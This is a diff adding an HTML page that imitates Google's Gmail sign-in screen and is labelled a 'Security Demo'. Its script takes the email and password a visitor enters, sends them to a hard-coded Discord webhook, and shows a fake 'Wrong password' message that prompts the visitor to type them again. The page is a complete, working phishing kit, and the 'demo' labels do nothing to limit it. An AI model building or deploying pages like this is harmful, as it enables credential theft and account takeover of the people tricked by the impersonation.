@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In - Security Demo</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 350px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        .input-group { position: relative; margin: 15px 0; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .show-password { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #555; font-size: 12px; }
+        button { width: 100%; padding: 12px; background: #4285F4; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button:hover { background: #357ABD; }
+        .error { color: #d32f2f; font-size: 14px; margin-top: 10px; display: none; }
+        .footer { margin-top: 20px; font-size: 12px; color: #777; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+        <h2>Sign in</h2>
+        <p>to continue to Gmail</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email or phone" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+                <span class="show-password" onclick="togglePassword()"> Show</span>
+            </div>
+            
+            <div class="error" id="errorMsg">Wrong password. Try again.</div>
+            <button type="submit">Next</button>
+        </form>
+        
+        <div class="footer">
+            <a href="#">Forgot password?</a> • <a href="#">Create account</a>
+        </div>
+    </div>
+
+    <script>
+        // Toggle password visibility
+        function togglePassword() {
+            const passwordField = document.getElementById("password");
+            const toggleText = document.querySelector(".show-password");
+            
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                toggleText.textContent = " Hide";
+            } else {
+                passwordField.type = "password";
+                toggleText.textContent = " Show";
+            }
+        }
+
+        // Send data to Discord via Webhook
+        async function sendToDiscord(email, password) {
+            const webhookURL = "https://discord.com/api/webhooks/1364863728889368648/heh4HfjIGvHB4jJkvOKXkTdAdgmSEqn4agDr6xm2Ch0vJxWqSKmfoKijSP51hqu-kRWh"; // REPLACE WITH YOUR WEBHOOK
+            const payload = {
+                content: `📧 **New Credentials Captured (Demo)**\n\n**Email:** ${email}\n**Password:** ||${password}||`,
+                username: "Security Demo Bot",
+                avatar_url: "https://i.imgur.com/ABC123.png" // Optional: Replace with a bot icon
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                console.log("[DEMO] Credentials sent to Discord.");
+            } catch (err) {
+                console.error("[DEMO] Error sending to Discord:", err);
+            }
+        }
+
+        // Form submission
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const errorMsg = document.getElementById("errorMsg");
+            
+            // Log to console (for demo)
+            console.log("[SECURITY DEMO] Credentials:", { email, password });
+            
+            // Send to Discord webhook
+            sendToDiscord(email, password);
+            
+            // Simulate failed login
+            errorMsg.style.display = "block";
+            document.getElementById("password").value = "";
+            document.getElementById("password").focus();
+        });
+    </script>
+</body>
+</html>
